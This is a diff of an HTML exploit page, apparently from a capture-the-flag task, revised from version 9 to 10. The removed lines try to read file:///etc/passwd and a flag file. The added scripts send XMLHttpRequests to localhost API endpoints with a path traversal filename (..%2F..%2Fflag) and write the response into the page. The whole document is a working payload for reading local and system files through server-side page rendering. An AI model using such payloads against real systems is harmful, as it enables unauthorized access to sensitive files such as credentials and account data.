@@ -1,23 +1,35 @@
 <html>
-<head>
-  <link rel="attachment" href="file:///app/flag">
-  <link rel="attachment" href="file:///etc/passwd">
-</head>
     <body>
 
-        ver 9
+        ver 10
 
- <div id="file">kek</div>
+ <div id="file1">kek</div>
+ <div id="file2">kek</div>
+ <div id="file3">kek</div>
     <script>
-        const el = document.getElementById('file');
+        const el = document.getElementById('file1');
         function reqListener () {
             el.innerHTML = this.responseText;
         }
 
         var oReq = new XMLHttpRequest();
         oReq.addEventListener("load", reqListener);
-        oReq.open("GET", "file:///etc/passwd");
+        oReq.open("GET", "http://127.0.0.1:8001/api/file?filename=..%2F..%2Fflag");
         oReq.send();
-    </script>        
+    </script> 
+
+    <script>
+        const el = document.getElementById('file2');
+        function reqListener () {
+            el.innerHTML = this.responseText;
+        }
+
+        var oReq = new XMLHttpRequest();
+        oReq.addEventListener("load", reqListener);
+        oReq.open("GET", "http://127.0.0.1/api/file?filename=..%2F..%2Fflag");
+        oReq.send();
+    </script>       
+
+      
     </body>
 </html>
